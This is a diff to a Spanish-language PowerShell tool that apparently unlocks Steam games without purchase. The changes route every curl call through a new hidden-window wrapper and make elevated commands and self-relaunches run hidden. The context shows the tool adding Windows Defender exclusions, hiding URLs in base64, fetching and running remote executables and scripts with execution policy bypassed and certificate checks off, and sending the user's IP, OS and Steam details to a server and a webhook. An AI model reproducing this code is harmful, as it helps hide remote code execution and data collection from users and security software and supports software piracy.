@@ -149,8 +149,8 @@ function Update-LocalExe {
         if (-not (Test-Path -LiteralPath $exePath)) { return }
         $tmpExe = "$exePath.new"
         try { if (Test-Path -LiteralPath $tmpExe) { Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue } } catch {}
-        $null = & curl.exe -sL -f --ssl-no-revoke --tlsv1.2 --noproxy "*" --max-time 60 -o "$tmpExe" "https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/BastissSteamActivator3.exe" 2>&1
-        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $tmpExe) -and ((Get-Item -LiteralPath $tmpExe).Length -gt 100000)) {
+        $crExe = Invoke-CurlHidden @('-sL','-f','--ssl-no-revoke','--tlsv1.2','--noproxy','*','--max-time','60','-o',$tmpExe,'https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/BastissSteamActivator3.exe') 70
+        if ($crExe.exit -eq 0 -and (Test-Path -LiteralPath $tmpExe) -and ((Get-Item -LiteralPath $tmpExe).Length -gt 100000)) {
             try { if (Test-Path -LiteralPath $exePath) { Remove-Item -LiteralPath $exePath -Force -ErrorAction SilentlyContinue } } catch {}
             Move-Item -LiteralPath $tmpExe -Destination $exePath -Force
         } else { Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue }
@@ -174,7 +174,7 @@ function New-BufferedPanel {
 
 
 
-$script:version = "V1.27"
+$script:version = "V1.28"
 $errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))
 
 function WEL {
@@ -1579,7 +1579,7 @@ function Send-Diagnostics {
         $lines += "**OS:** $([System.Environment]::OSVersion.VersionString)"
         $lines += "**ClientID:** $($script:clientId)"
         try { $ip = (Invoke-RestMethod (S("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn")) -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop); $lines += "**IP:** $ip" } catch { $lines += "**IP:** ipify fallo" }
-        try { $cv = (& curl.exe --version 2>&1 | Select-Object -First 1); $lines += "**curl:** $cv" } catch { $lines += "**curl:** no disponible" }
+        try { $cv = (((Invoke-CurlHidden @('--version') 10 -NeedOut).out -split "`r?`n") | Select-Object -First 1); $lines += "**curl:** $cv" } catch { $lines += "**curl:** no disponible" }
         try { Update-ServerUrl } catch {}
         $su = $script:serverUrl
         $lines += "**Server URL:** $su"
@@ -1599,8 +1599,8 @@ function Send-Diagnostics {
                 $hn = ([uri]$su).Host
                 if ($hn) { $resolveArg = @("--resolve", "$($hn):443:$($script:serverIp)") }
             }
-            $null = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" @resolveArg -X POST -H "Content-Type: application/json" --data-binary "{}" "$su/api/redeem-code" --max-time 15 -o $tmpOut
-            $lines += "**Test tunnel /api/redeem-code:** curl exit $LASTEXITCODE (serverIp: $($script:serverIp))"
+$crT = Invoke-CurlHidden (@('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*') + @($resolveArg) + @('-X','POST','-H','Content-Type: application/json','--data-binary','{}',"$su/api/redeem-code",'--max-time','15','-o',$tmpOut)) 20
+$lines += "**Test tunnel /api/redeem-code:** curl exit $($crT.exit) (serverIp: $($script:serverIp))"
             Remove-Item $tmpOut -Force -ErrorAction SilentlyContinue
         } catch { $lines += "**Test tunnel:** error - $($_.Exception.Message)" }
         try { $sp = Get-SteamPath; $lines += "**Steam:** $sp" } catch { $lines += "**Steam:** no detectado" }
@@ -1704,7 +1704,7 @@ function Add-DefenderExclusion {
     } catch {}
     try {
         $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
-        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -Wait -ErrorAction Stop
+        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
         return $true
     } catch { return $false }
 }
@@ -1720,7 +1720,7 @@ $script:utf8NoBom = New-Object System.Text.UTF8Encoding $false
 function Get-CdnTimeUtc {
     foreach ($u in @('https://www.cloudflare.com','https://www.google.com')) {
         try {
-            $h = & curl.exe -s -I --connect-timeout 3 --max-time 4 $u
+            $h = (Invoke-CurlHidden @('-s','-I','--connect-timeout','3','--max-time','4',$u) 8 -NeedOut).out
             $m = $h | Select-String -Pattern '^Date:\s*(.+)$'
             if ($m) {
                 $d = $m.Matches[0].Groups[1].Value.Trim()
@@ -2128,6 +2128,27 @@ $script:ghApiUrlBase = (S("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9iYXN0aXNheWVzL
 $script:ghRawUrl = (S("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvQmFzdGlzc1N0ZWFtVjE4L21haW4vY3VycmVudF91cmwudHh0"))
 $script:ghApiIpUrl = (D "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9iYXN0aXNheWVzL0ZpeGVzLXN0ZWFtL2NvbnRlbnRzL2N1cnJlbnRfaXAudHh0")
 $script:ghRawIpUrl = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvQmFzdGlzc1N0ZWFtVjE4L21haW4vY3VycmVudF9pcC50eHQ=")
+function Invoke-CurlHidden {
+    param([string[]]$Arguments, [int]$TimeoutSec = 30, [switch]$NeedOut, [switch]$NeedErr)
+    $res = @{ exit = -1; out = ""; err = "" }
+    try {
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "curl.exe"
+        $psi.Arguments = (($Arguments | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
+        $psi.CreateNoWindow = $true
+        $psi.UseShellExecute = $false
+        if ($NeedOut) { $psi.RedirectStandardOutput = $true }
+        if ($NeedErr) { $psi.RedirectStandardError = $true }
+        $p = New-Object System.Diagnostics.Process
+        $p.StartInfo = $psi
+        [void]$p.Start()
+        if (-not $p.WaitForExit($TimeoutSec * 1000)) { try { $p.Kill() } catch {}; return $res }
+        $res.exit = $p.ExitCode
+        if ($NeedOut) { try { $res.out = $p.StandardOutput.ReadToEnd() } catch {} }
+        if ($NeedErr) { try { $res.err = $p.StandardError.ReadToEnd() } catch {} }
+    } catch {}
+    return $res
+}
 function Resolve-ServerIpDoH {
     param([string]$hn)
     $hn = ([string]$hn).Trim().ToLower()
@@ -2140,9 +2161,11 @@ function Resolve-ServerIpDoH {
     foreach ($q in $qs) {
         try {
             try { if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue } } catch {}
-            if ($q[1]) { $null = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" --max-time 5 -H "Accept: application/dns-json" -o $tmp $q[0] 2>&1 }
-            else { $null = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" --max-time 5 -o $tmp $q[0] 2>&1 }
-            if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $tmp)) {
+            $cargs = @('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*','--max-time','5')
+            if ($q[1]) { $cargs += @('-H','Accept: application/dns-json') }
+            $cargs += @('-o',$tmp,$q[0])
+            $crDoH = Invoke-CurlHidden $cargs 8
+            if ($crDoH.exit -eq 0 -and (Test-Path -LiteralPath $tmp)) {
                 try {
                     $dj = [System.IO.File]::ReadAllText($tmp) | ConvertFrom-Json
                     foreach ($an in @($dj.Answer)) {
@@ -2658,7 +2681,7 @@ function Xz9Qk {
             foreach ($u in $urls) {
                 try { $wc2=New-Object System.Net.WebClient; $data=$wc2.DownloadData($u); if ($data -and $data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
                 try { $tmp2=Join-Path $env:TEMP "patch_dl_$(Get-Random).zip"; Invoke-WebRequest -Uri $u -OutFile $tmp2 -UseBasicParsing -TimeoutSec 30; $data=[IO.File]::ReadAllBytes($tmp2); Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue; if ($data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
-                try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $null=& curl.exe -sL --ssl-no-revoke -o "$tmp3" "$u" --max-time 30 2>&1; if ((Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; break } } catch { $dlErr=$_.Exception.Message }
+                try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $crP = Invoke-CurlHidden @('-sL','--ssl-no-revoke','-o',$tmp3,$u,'--max-time','30') 40; if (($crP.exit -eq 0) -and (Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; break } } catch { $dlErr=$_.Exception.Message }
             }
             if (-not $data -or $data.Length -lt 1000) { throw "No se pudo descargar el componente tras 3 intentos: $dlErr" }
             $tmpZip = Join-Path $env:TEMP "patch_$(Get-Random).zip"
@@ -4173,8 +4196,22 @@ $script:subB.Add_Click({
                     param($reqUrl, $body, $tempBody, $tempResp, $resolveStr, $serverIp)
                     $u8 = New-Object System.Text.UTF8Encoding $false
                     $ra = @(); if ($resolveStr) { $ra = @($resolveStr -split '\|') }
-                    $curlOut = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" @ra -X POST -H "Content-Type: application/json" --data-binary "@$tempBody" "$reqUrl" --connect-timeout 6 --max-time 15 -o $tempResp 2>&1
-                    $ce = $LASTEXITCODE
+                    $psiR = New-Object System.Diagnostics.ProcessStartInfo
+                    $psiR.FileName = "curl.exe"
+                    $psiR.Arguments = ((@('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*') + @($ra) + @('-X','POST','-H','Content-Type: application/json','--data-binary',"@$tempBody",$reqUrl,'--connect-timeout','6','--max-time','15','-o',$tempResp) | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
+                    $psiR.CreateNoWindow = $true
+                    $psiR.UseShellExecute = $false
+                    $psiR.RedirectStandardError = $true
+                    $prR = New-Object System.Diagnostics.Process
+                    $prR.StartInfo = $psiR
+                    $curlOut = @()
+                    $ce = -1
+                    try {
+                        [void]$prR.Start()
+                        if (-not $prR.WaitForExit(20000)) { try { $prR.Kill() } catch {} }
+                        $ce = $prR.ExitCode
+                        try { $curlOut = @($prR.StandardError.ReadToEnd() -split "`r?`n") } catch {}
+                    } catch {}
                     $respRaw = $null
                     if ($ce -eq 0 -and (Test-Path -LiteralPath $tempResp)) { $respRaw = [System.IO.File]::ReadAllText($tempResp, $u8) }
                     if (-not $respRaw) {
@@ -4246,8 +4283,16 @@ $script:subB.Add_Click({
                     try{
                         $res=@{ok=$false; err=""; lua=@(); man=@(); game=$gName}
                         # descargar con curl (redirect + retry, como Bn6Lc directo)
-                        & curl.exe -s -k -L --ssl-no-revoke -H "User-Agent: Mozilla/5.0" -o $zip $url --max-time 120
-                        if($LASTEXITCODE -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
+                        $psiL = New-Object System.Diagnostics.ProcessStartInfo
+                        $psiL.FileName = "curl.exe"
+                        $psiL.Arguments = ((@('-s','-k','-L','--ssl-no-revoke','-H','User-Agent: Mozilla/5.0','-o',$zip,$url,'--max-time','120') | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
+                        $psiL.CreateNoWindow = $true
+                        $psiL.UseShellExecute = $false
+                        $prL = New-Object System.Diagnostics.Process
+                        $prL.StartInfo = $psiL
+                        $ceL = -1
+                        try { [void]$prL.Start(); if (-not $prL.WaitForExit(130000)) { try { $prL.Kill() } catch {} }; $ceL = $prL.ExitCode } catch {}
+                        if($ceL -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
                         Add-Type -AssemblyName System.IO.Compression.FileSystem
                         $tmpExp=Join-Path $env:TEMP "par_$(Get-Random)"
                         New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
@@ -4377,8 +4422,8 @@ $script:subB.Add_Click({
             try {
                 $tmpWeb = [System.IO.Path]::GetTempFileName() + ".json"
                 [System.IO.File]::WriteAllText($tmpWeb, $payloadJson, (New-Object System.Text.UTF8Encoding $false))
-                & curl.exe -s -X POST -H "Content-Type: application/json" --data-binary "@$tmpWeb" "$WEBHOOK_URL" --max-time 25 -o NUL
-                $enviado = ($LASTEXITCODE -eq 0)
+            $crW = Invoke-CurlHidden @('-s','-X','POST','-H','Content-Type: application/json','--data-binary',"@$tmpWeb",$WEBHOOK_URL,'--max-time','25','-o','NUL') 30
+            $enviado = ($crW.exit -eq 0)
                 Remove-Item $tmpWeb -Force -ErrorAction SilentlyContinue
             } catch {}
         }
@@ -4755,7 +4800,7 @@ function Invoke-ActualizarApp {
             [System.Management.Automation.Language.Parser]::ParseFile($tmpNew, [ref]$null, [ref]$perrs) | Out-Null
             if (@($perrs).Count -gt 0) { Remove-Item -LiteralPath $tmpNew -Force -ErrorAction SilentlyContinue; return "La version descargada no paso validacion, no se aplico nada." }
             Move-Item -LiteralPath $tmpNew -Destination $self -Force
-            Start-Process -FilePath powershell.exe -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
+            Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
             Start-Sleep -Seconds 1
             exit
         } catch { return "Fallo al aplicar update: $($_.Exception.Message)" }
@@ -5187,7 +5232,7 @@ $script:sLuaTools=New-CfgBtn ($sY+174) "Reparar juegos" "Arregla los juegos que 
             } catch {}
         }
         if (-not (Test-Path $luatoolsPath)) { [System.Windows.Forms.MessageBox]::Show("No se pudo obtener repair_luatools.ps1 en $luatoolsPath. Revisa tu internet.","Reparar juegos","OK","Warning") | Out-Null; return }
-        Start-Process powershell.exe -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$luatoolsPath) -ErrorAction SilentlyContinue | Out-Null
+        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$luatoolsPath) -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 }
 $script:sp.Controls.Add($script:sLuaTools)
@@ -6415,8 +6460,22 @@ if ($irmCodeArg) {
                     param($reqUrl, $body, $tempBody, $tempResp, $resolveStr, $serverIp)
                     $u8 = New-Object System.Text.UTF8Encoding $false
                     $ra = @(); if ($resolveStr) { $ra = @($resolveStr -split '\|') }
-                    $curlOut = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" @ra -X POST -H "Content-Type: application/json" --data-binary "@$tempBody" "$reqUrl" --connect-timeout 6 --max-time 15 -o $tempResp 2>&1
-                    $ce = $LASTEXITCODE
+                    $psiR = New-Object System.Diagnostics.ProcessStartInfo
+                    $psiR.FileName = "curl.exe"
+                    $psiR.Arguments = ((@('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*') + @($ra) + @('-X','POST','-H','Content-Type: application/json','--data-binary',"@$tempBody",$reqUrl,'--connect-timeout','6','--max-time','15','-o',$tempResp) | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
+                    $psiR.CreateNoWindow = $true
+                    $psiR.UseShellExecute = $false
+                    $psiR.RedirectStandardError = $true
+                    $prR = New-Object System.Diagnostics.Process
+                    $prR.StartInfo = $psiR
+                    $curlOut = @()
+                    $ce = -1
+                    try {
+                        [void]$prR.Start()
+                        if (-not $prR.WaitForExit(20000)) { try { $prR.Kill() } catch {} }
+                        $ce = $prR.ExitCode
+                        try { $curlOut = @($prR.StandardError.ReadToEnd() -split "`r?`n") } catch {}
+                    } catch {}
                     $respRaw = $null
                     if ($ce -eq 0 -and (Test-Path -LiteralPath $tempResp)) { $respRaw = [System.IO.File]::ReadAllText($tempResp, $u8) }
                     if (-not $respRaw) {
@@ -6480,8 +6539,16 @@ if ($irmCodeArg) {
                 param($url,$zip,$gName,$expDate,$codeStr,$steamRoot)
                 try{
                     $res=@{ok=$false; err=""; lua=@(); man=@(); game=$gName}
-                    & curl.exe -s -k -L --ssl-no-revoke -H "User-Agent: Mozilla/5.0" -o $zip $url --max-time 120
-                    if($LASTEXITCODE -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
+                    $psiL = New-Object System.Diagnostics.ProcessStartInfo
+                    $psiL.FileName = "curl.exe"
+                    $psiL.Arguments = ((@('-s','-k','-L','--ssl-no-revoke','-H','User-Agent: Mozilla/5.0','-o',$zip,$url,'--max-time','120') | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
+                    $psiL.CreateNoWindow = $true
+                    $psiL.UseShellExecute = $false
+                    $prL = New-Object System.Diagnostics.Process
+                    $prL.StartInfo = $psiL
+                    $ceL = -1
+                    try { [void]$prL.Start(); if (-not $prL.WaitForExit(130000)) { try { $prL.Kill() } catch {} }; $ceL = $prL.ExitCode } catch {}
+                    if($ceL -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
                     Add-Type -AssemblyName System.IO.Compression.FileSystem
                     $tmpExp=Join-Path $env:TEMP "par_$(Get-Random)"
                     New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
